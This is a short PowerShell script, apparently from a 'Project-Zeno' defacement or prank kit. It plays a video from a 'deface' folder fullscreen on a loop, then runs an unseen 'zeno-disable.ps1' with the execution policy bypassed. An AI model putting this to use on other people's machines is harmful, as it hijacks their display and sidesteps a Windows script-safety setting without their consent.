# Path to the MP4 video file

$desktopPath = [Environment]::GetFolderPath('Desktop')

# Concatenate the path to your video
$videoPath = $desktopPath + "\Project-Zeno\deface\zeno"

# Check if VLC is installed
$vlcPath = "C:\Program Files\VideoLAN\VLC\vlc.exe"
if (Test-Path $vlcPath) {
    # If VLC is found, use it to play the video
    Start-Process $vlcPath -ArgumentList "$videoPath --fullscreen --loop"
}
# Check if Windows Media Player is installed
elseif (Test-Path "C:\Program Files (x86)\Windows Media Player\wmplayer.exe") {
    # If Windows Media Player is found, use it to play the video
    $wmPlayerPath = "C:\Program Files (x86)\Windows Media Player\wmplayer.exe"
    Start-Process $wmPlayerPath -ArgumentList "/fullscreen", "/loop", $videoPath
}
else {
    Write-Host "Neither VLC nor Windows Media Player is installed on this system."
}


powershell -ExecutionPolicy Bypass -File ".\zeno-disable.ps1"
